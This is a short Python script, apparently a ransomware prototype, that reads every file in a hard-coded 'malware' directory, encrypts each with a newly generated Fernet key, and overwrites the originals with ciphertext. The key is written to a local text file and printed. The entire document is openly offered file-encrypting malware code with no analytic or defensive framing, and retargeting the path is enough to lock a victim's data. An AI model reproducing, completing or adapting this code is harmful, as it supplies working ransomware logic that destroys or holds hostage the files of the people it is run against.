import os
import shutil
from cryptography.fernet import Fernet

malware_dir_files = []
malware_dir_readfiles = []
make_dir_path_sucker = r"C:\Users\User\source\malware"

for i in os.listdir(make_dir_path_sucker):
    if os.path.isfile(os.path.join(make_dir_path_sucker,i)) == True:
        malware_dir_files.append(i)

for i in malware_dir_files:
    with open(os.path.join(make_dir_path_sucker,i),'r') as reader:
        malware_dir_readfiles.append(reader.read())

for i in malware_dir_readfiles:
    print(i)

fernet_key = Fernet.generate_key()
with open('file4.txt','wb') as writer:
    writer.write(fernet_key)

Encrypt_fernet_ini = Fernet(fernet_key)

for i in malware_dir_readfiles:
    en_val = Encrypt_fernet_ini.encrypt(i.encode('UTF-8'))
    malware_dir_readfiles[malware_dir_readfiles.index(i)] = en_val

for i in malware_dir_readfiles:
    print(i)

looper = 0

for i in malware_dir_files:
    with open(os.path.join(make_dir_path_sucker,i),'wb') as writer:
        writer.write(malware_dir_readfiles[malware_dir_files.index(i)])

print()
print()
print(fernet_key.decode())
